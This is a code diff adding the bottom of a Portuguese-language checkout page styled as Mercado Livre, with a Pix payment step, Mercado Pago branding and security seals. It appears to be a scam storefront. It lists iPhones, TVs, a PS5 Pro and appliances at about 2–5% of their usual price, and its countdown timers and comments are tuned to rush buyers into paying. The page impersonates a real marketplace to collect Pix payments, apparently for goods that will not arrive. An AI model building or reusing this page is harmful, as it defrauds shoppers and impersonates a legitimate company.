+              <li class="pix-step-item"><span class="pix-step-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="6" y="2.5" width="12" height="19" rx="2.5"/><path d="M11 18.5h2"/></svg></span><span>No app do seu banco, escolha <b>Pix Copia e Cola</b> e cole o código</span></li>
+              <li class="pix-step-item"><span class="pix-step-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="m8 12.5 2.8 2.8L16.5 9.5"/></svg></span><span>Confirme o pagamento. A compra é aprovada na hora</span></li>
+            </ol>
+          </div>
+
+          <!-- Polling status -->
+          <div class="pix-status" id="payment-status">
+            <div class="pix-status-dot"></div>
+            <span>Aguardando pagamento...</span>
+          </div>
+
+          <button class="pix-link-btn" onclick="checkPayment()" id="check-btn">Já paguei</button>
+
+          <!-- Trust + Social Proof Footer -->
+          <div class="pix-trust-footer">
+            <div class="pix-trust-row">
+              <div class="pix-trust-item">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="#00a650"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+                <span>Pagamento seguro</span>
+              </div>
+              <div class="pix-trust-item">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="#00a650"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                <span>Dados protegidos</span>
+              </div>
+            </div>
+            <div class="pix-trust-mp">Processado por <b class="pix-mp">Mercado Pago</b></div>
+          </div>
+
+        </div>
+
+        <!-- Payment confirmed -->
+        <div id="pix-confirmed" class="pix-confirmed" style="display:none;">
+          <div class="confirmed-check">
+            <svg width="56" height="56" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="#00a650"/></svg>
+          </div>
+          <h3>Pagamento aprovado!</h3>
+          <p>Redirecionando...</p>
+        </div>
+      </div>
+
+    </section>
+
+    <!-- ======== FOOTER ======== -->
+    <footer class="ml-footer">
+      <!-- [16/11] selo "Compra 100% segura" no rodapé (antes ficava no meio da revisão); segue ligado à flag trust_signals -->
+      <div class="trust-reinforcement" id="trustSignals" style="display:none;text-align:center;margin-bottom:12px">
+        <div style="display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:8px">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="#00a650"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+          <span style="font-size:0.82rem;color:#00a650;font-weight:600">Compra 100% segura</span>
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="#00a650"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+        </div>
+        <div style="font-size:0.72rem;color:#999;line-height:1.4">Seus dados estão protegidos com criptografia de ponta.<br>Garantia Mercado Livre · Devolução grátis em até 30 dias.</div>
+      </div>
+      <div class="ml-footer-inner">
+        <span>Mercado Livre &copy; 2026</span>
+        <span class="ml-footer-sep">&middot;</span>
+        <span>Pagamento seguro</span>
+      </div>
+    </footer>
+
+  </main>
+
+  <!-- ======== STICKY TIMER ======== -->
+  <div class="sticky-timer" id="sticky-timer">
+    <div class="sticky-timer-inner">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="#333"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+      <span>Oferta expira em</span>
+      <div class="timer-nums">
+        <b id="timer-hours">00</b>:<b id="timer-mins">05</b>:<b id="timer-secs">30</b>
+      </div>
+    </div>
+  </div>
+
+  <!-- ======== SCRIPTS ======== -->
+  <script src="/assets/js/qrcode.min.js"></script>
+  <script src="/assets/js/feature-flags.js"></script>
+  <script src="/assets/js/cart.js?v=3"></script>
+  <script src="/assets/js/ml-analytics-v3.js?v=tt2"></script>
+  <script src="/assets/js/repix.js?v=1"></script>
+  <script>window.__sugestoes = [{"id":"bicicleta-hdj-gs006","name":"Bicicleta Elétrica Scooter HDJ GS006 1000W","image":"/midia/bicicleta-hdj-gs006/bege1.webp","oldPrice":"R$ 3.999,00","newPrice":"R$ 189,90","tag":"OFERTA DO DIA","cat":"mobilidade"},{"id":"geladeira","name":"Geladeira Brastemp 588L Inox 220V","image":"/midia/geladeira/geladeira.jpg","oldPrice":"R$ 3.999,00","newPrice":"R$ 167,82","tag":"OFERTA DO DIA","cat":"eletro"},{"id":"iphone17","name":"iPhone 17 Pro Max 256GB - Laranja-cósmico","image":"/midia/iphone17/laranja1.webp","oldPrice":"R$ 11.800,00","newPrice":"R$ 179,99","tag":"OFERTA DO DIA","cat":"celular"},{"id":"jbl01","name":"Caixa De Som Jbl Boombox 4 Bluetooth","image":"/midia/jbl01/bb4_preto1.webp","oldPrice":"R$ 2.999,90","newPrice":"R$ 67,79","tag":"OFERTA DO DIA","cat":"audio"},{"id":"sofa","name":"Sofa Retratil Reclinavel 2,00m King House","image":"/midia/sofa/s1-1.jpg","oldPrice":"R$ 2.990,05","newPrice":"R$ 79,47","tag":"OFERTA DO DIA","cat":"casa"},{"id":"tv","name":"Smart Tv 55 Samsung Neo Qled Vision Ai 4k - Qn70h (2026)","image":"/midia/tv/qn70h_1.webp","oldPrice":"R$ 2.999,99","newPrice":"R$ 142,98","tag":"OFERTA DO DIA","cat":"eletro"},{"id":"ar","name":"Ar Condicionado Split LG 24000 BTUs","image":"/midia/ar/ar1.webp","oldPrice":"R$ 1.499,90","newPrice":"R$ 114,19","tag":"OFERTA DO DIA","cat":"eletro"},{"id":"iphone16-preto","name":"iPhone 16 Pro Max (1 TB) - Titânio-Preto","image":"/midia/iphone16-preto/iphon1-1.jpg","oldPrice":"R$ 12.895,00","newPrice":"R$ 139,33","tag":"OFERTA DO DIA","cat":"celular"},{"id":"iph09","name":"iPhone 15 Pro (256GB) Titanio","image":"/midia/iph09/iphone_15_pro_titanio.jpg","oldPrice":"R$ 6.999,00","newPrice":"R$ 117,58","tag":"OFERTA DO DIA","cat":"celular"},{"id":"iph07","name":"iPhone 15 (256GB) Rosa","image":"/midia/iph07/iphone_15_rosa.jpg","oldPrice":"R$ 5.849,10","newPrice":"R$ 97,90","tag":"OFERTA DO DIA","cat":"celular"},{"id":"iph06","name":"iPhone 15 Pro (256GB) Titanio Branco","image":"/midia/iph06/iphone_15_pro_max_titanio_branco.jpg","oldPrice":"R$ 5.849,10","newPrice":"R$ 117,58","tag":"OFERTA DO DIA","cat":"celular"},{"id":"xiaome","name":"Xiaomi POCO X5 256GB Blue","image":"/midia/xiaome/x1-1.jpg","oldPrice":"R$ 1.685,00","newPrice":"R$ 87,00","tag":"OFERTA DO DIA","cat":"celular"},{"id":"sam25","name":"Samsung Galaxy S25 Ultra 5G 512GB Titanio Preto","image":"/midia/sam25/s1-1.jpg","oldPrice":"R$ 10.398,00","newPrice":"R$ 247,90","tag":"OFERTA DO DIA","cat":"celular"},{"id":"xiaomex7","name":"Xiaomi Poco X7 Pro 512GB+12GB 2025","image":"/midia/xiaomex7/x1-1.jpg","oldPrice":"R$ 3.999,00","newPrice":"R$ 148,89","tag":"OFERTA DO DIA","cat":"celular"},{"id":"xiaomex6","name":"Xiaomi Poco X6 Pro 256GB Preto","image":"/midia/xiaomex6/x1-1.jpg","oldPrice":"R$ 3.527,00","newPrice":"R$ 97,37","tag":"OFERTA DO DIA","cat":"celular"},{"id":"microo","name":"Microondas Brastemp 38L Inox","image":"/midia/microo/m1-1.jpg","oldPrice":"R$ 1.757,99","newPrice":"R$ 102,16","tag":"OFERTA DO DIA","cat":"eletro"},{"id":"kitferramenta","name":"Kit Combinado 7 Ferramentas DEWALT","image":"/midia/kitferramenta/ferramenta.jpg","oldPrice":"R$ 1.050,90","newPrice":"R$ 83,97","tag":"OFERTA DO DIA","cat":"casa"},{"id":"fogao","name":"Fogao 5 Bocas Atlas Mesa de Vidro 127V/220V","image":"/midia/fogao/f1-1.jpg","oldPrice":"R$ 2.099,90","newPrice":"R$ 99,99","tag":"OFERTA DO DIA","cat":"eletro"},{"id":"projetor04","name":"Samsung Galaxy S24 Ultra 5G 512GB Preto","image":"/midia/projetor04/1.jpg","oldPrice":"R$ 4.398,00","newPrice":"R$ 97,90","tag":"OFERTA DO DIA","cat":"celular"},{"id":"lavar","name":"Lava E Seca Samsung Inox 11kg","image":"/midia/lavar/lavar1.jpg","oldPrice":"R$ 3.999,99","newPrice":"R$ 116,90","tag":"OFERTA DO DIA","cat":"eletro"},{"id":"ps5","name":"PlayStation PS5 PRO Branco 2 TB","image":"/midia/ps5/s1-1.jpg","oldPrice":"R$ 6.499,99","newPrice":"R$ 108,17","tag":"OFERTA DO DIA","cat":"gaming"},{"id":"jbl02","name":"JBL Partybox 710 Preta","image":"/midia/jbl02/JBL2.webp","oldPrice":"R$ 5.398,00","newPrice":"R$ 89,98","tag":"OFERTA DO DIA","cat":"audio"},{"id":"guarda-branco","name":"Guarda-roupa Casal Easy Slim com Espelho","image":"/midia/guarda-branco/g1.jpg","oldPrice":"R$ 1.049,05","newPrice":"R$ 114,60","tag":"OFERTA DO DIA","cat":"casa"},{"id":"guarda-preto","name":"Guarda Roupa Casal 8 Portas Preto Fosco","image":"/midia/guarda-preto/g1.jpg","oldPrice":"R$ 1.049,00","newPrice":"R$ 107,00","tag":"OFERTA DO DIA","cat":"casa"},{"id":"fritadeira","name":"Air Fryer Fritadeira Eletrica","image":"/midia/fritadeira/f1.jpg","oldPrice":"R$ 529,99","newPrice":"R$ 81,24","tag":"OFERTA DO DIA","cat":"eletro"},{"id":"aspirador","name":"Robo Aspirador Robot W90","image":"/midia/aspirador/as1.jpg","oldPrice":"R$ 349,00","newPrice":"R$ 94,60","tag":"OFERTA DO DIA","cat":"eletro"}];</script>
+  <script src="/assets/js/prova-social.js"></script>
+  <script src="/assets/js/checkout.js?v=37"></script>
+  <script>
+  /* topo: título de cada etapa + seta que volta uma etapa (na 1ª, volta para os produtos) */
+  (function () {
+    var titulo = document.getElementById('ckTitulo'), nomes = { 2: 'Seus dados', 3: 'Entrega', 4: 'Pagamento' };
+    function passo() { var a = document.querySelector('.step-panel.active'); return a ? parseInt(a.id.replace('step-', ''), 10) || 1 : 1; }
+    function pinta() {
+      var n = passo();
+      titulo.textContent = n === 1 ? 'Carrinho (' + (typeof Cart !== 'undefined' ? Cart.getCount() : 0) + ')' : (nomes[n] || 'Checkout');
+    }
+    window.ckPintaTitulo = pinta;
+    document.querySelectorAll('.step-panel').forEach(function (el) { new MutationObserver(pinta).observe(el, { attributes: true, attributeFilter: ['class'] }); });
+    document.getElementById('ckVoltar').addEventListener('click', function () {
+      var n = passo();
+      if (n > 1 && document.getElementById('step-' + (n - 1))) goBack(); else goToRecompensas();   // goBack: no PIX volta pra revisão
+    });
+    pinta();
+  })();
+  </script>
+  <script id="bf-reservation">/* CRO: timer de reserva do desconto. [16/11] Só na etapa PAGAMENTO (step-4) e só começa a contar
+     quando o cliente chega nela — no formulário (carrinho/dados/entrega) a pressa fazia gente desistir.
+     Prazo de 15 min fica na sessão: voltar pra Entrega esconde a faixa, mas o prazo segue correndo. */
+  document.addEventListener('DOMContentLoaded',function(){
+    if(document.getElementById('bf-resv'))return;
+    var b=document.createElement('div');b.id='bf-resv';
+    b.style.cssText='display:none;text-align:center;font-weight:600;font-size:13px;padding:8px 12px;color:rgba(0,0,0,.85);background:#fff8d6;border-bottom:1px solid rgba(0,0,0,.06)';
+    b.innerHTML='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="13" r="8"/><path d="M12 9v4l2.5 2.5M9 2h6"/></svg><span>Seu desconto está reservado por <strong id="bf-rcd" style="color:#2968c8">15:00</strong></span>';
+    var hd=document.querySelector('.ck-topo');if(hd)hd.parentNode.insertBefore(b,hd.nextSibling);else document.body.insertBefore(b,document.body.firstChild);
+    var el=document.getElementById('bf-rcd'),DUR=900000,key='ml_resv_pagamento15',dl=0,rodando=false;
+    // pago = tela "pagamento aprovado" (#pix-confirmed) visível: aí a faixa some de vez
+    function pago(){var c=document.getElementById('pix-confirmed');return !!(c&&c.style.display!=='none');}
+    function emPagamento(){var s=document.getElementById('step-4');return !!(s&&s.classList.contains('active'))&&!pago();}
+    function t(){
+      if(!emPagamento()){b.style.display='none';rodando=false;return;}
+      var ms=dl-Date.now();
+      if(ms<=0){b.style.display='none';rodando=false;return;}  // acabou o prazo: some (não fica "reservado por 00:00")
+      var m=Math.floor(ms/60000),s=Math.floor(ms%60000/1000);
+      el.textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;
+      if(ms<120000){b.style.background='#fdecea';el.style.color='#c62828';}
+      if(ms>0)setTimeout(t,1000);else rodando=false;
+    }
+    function atualiza(){
+      if(!emPagamento()){b.style.display='none';return;}
+      try{dl=parseInt(sessionStorage.getItem(key)||'0',10);}catch(e){dl=0;}
+      if(!dl||dl<Date.now()){dl=Date.now()+DUR;try{sessionStorage.setItem(key,String(dl));}catch(e){}}  // começa a contar aqui
+      b.style.display='flex';
+      if(!rodando){rodando=true;t();}
+    }
+    // a troca de etapa passa por window.goToStep (checkout.js): confere depois de cada troca
+    var orig=window.goToStep;
+    if(typeof orig==='function'){window.goToStep=function(){var r=orig.apply(this,arguments);atualiza();return r;};}
+    // pagamento aprovado (checkout.js mostra #pix-confirmed): esconde na hora, mesmo com o relógio já parado em 00:00
+    var conf=document.getElementById('pix-confirmed');
+    if(conf&&window.MutationObserver){new MutationObserver(atualiza).observe(conf,{attributes:true,attributeFilter:['style']});}
+    atualiza();
+  });</script>
+</body>
+</html>
